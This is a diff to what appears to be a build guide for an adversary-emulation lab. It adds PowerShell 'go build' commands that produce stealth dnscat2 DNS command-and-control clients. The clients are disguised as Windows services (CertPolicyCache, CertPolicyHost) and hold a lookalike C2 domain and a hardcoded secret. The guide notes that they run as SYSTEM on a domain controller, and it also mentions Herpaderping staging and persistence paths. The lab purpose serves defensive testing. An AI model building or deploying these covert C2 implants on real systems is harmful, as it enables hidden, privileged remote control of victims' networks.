@@ -135,7 +135,7 @@ Four binaries must be built before running Phase 3. Build order does not matter;
 
 **Source:** `resources/payloads/rce-and-c2/dnscat2/go-client/`
 
-Used as the source PE for three staged artifacts: `CertCA.enc` (XOR-encrypted for Herpaderping), `policyupdate.exe` (WMI subscription trigger), and `policysync.exe` (service-backed C2). Same source and flags as `svcmgr.exe` (Phase 1 Build #1) — only the output name differs.
+Used as the source PE for two staged artifacts: `CertCA.enc` (XOR-encrypted for Herpaderping) and `policyupdate.exe` (WMI subscription trigger). Same source and flags as `svcmgr.exe` (Phase 1 Build #1) — only the output name differs.
 
 ```powershell
 cd resources\payloads\rce-and-c2\dnscat2\go-client
@@ -151,6 +151,50 @@ go build -tags stealth -trimpath `
 **Output:** `resources/payloads/rce-and-c2/dnscat2/go-client/dnscat2.exe`
 
 Uses `dnsapi.dll!DnsQuery_W` — UDP/53 socket is held by `svchost.exe` (Dnscache). Requires the conditional forwarder on DC01 for `crl.ms-cert.net`. The `stage --encrypt` command in Phase 3 Step 1 reads this file and applies position-dependent XOR before base64-streaming.
+
+---
+
+### 6a. `policysync.exe` — service-backed C2 (SCM name: `CertPolicyCache`)
+
+**Source:** `resources/payloads/rce-and-c2/dnscat2/go-client/`
+
+```powershell
+cd resources\payloads\rce-and-c2\dnscat2\go-client
+
+go build -tags stealth -trimpath `
+    -ldflags="-s -w -buildid= -H windowsgui `
+      -X main.DefaultServiceName=CertPolicyCache `
+      -X main.DefaultDomain=crl.ms-cert.net `
+      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
+      -X main.DefaultDNSTypes=A,CNAME" `
+    -o policysync.exe ./cmd/dnsapi-service/
+```
+
+**Output:** `resources/payloads/rce-and-c2/dnscat2/go-client/policysync.exe`
+
+SCM-aware service binary for the registry-backed persistence path (Step 7). Reads C2 config from `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyCache\Parameters` at startup, falling back to build-time ldflags defaults. `svc.Run` is dispatched with `CertPolicyCache` — must match the service name written by `NtServiceInstaller.exe`.
+
+---
+
+### 6b. `policysync-host.exe` — service-backed C2 (SCM name: `CertPolicyHost`)
+
+**Source:** `resources/payloads/rce-and-c2/dnscat2/go-client/`
+
+```powershell
+cd resources\payloads\rce-and-c2\dnscat2\go-client
+
+go build -tags stealth -trimpath `
+    -ldflags="-s -w -buildid= -H windowsgui `
+      -X main.DefaultServiceName=CertPolicyHost `
+      -X main.DefaultDomain=crl.ms-cert.net `
+      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
+      -X main.DefaultDNSTypes=A,CNAME" `
+    -o policysync-host.exe ./cmd/dnsapi-service/
+```
+
+**Output:** `resources/payloads/rce-and-c2/dnscat2/go-client/policysync-host.exe`
+
+SCM-aware service binary for the API-based persistence path (Step 7B). Reads C2 config from `HKLM\SYSTEM\CurrentControlSet\Services\CertPolicyHost\Parameters` at startup. `svc.Run` is dispatched with `CertPolicyHost` — must match the service name created by `ServiceInstaller.exe`. SCM starts this binary as `LocalSystem`; the resulting C2 session runs as `NT AUTHORITY\SYSTEM` on DC01.
 
 ---
 
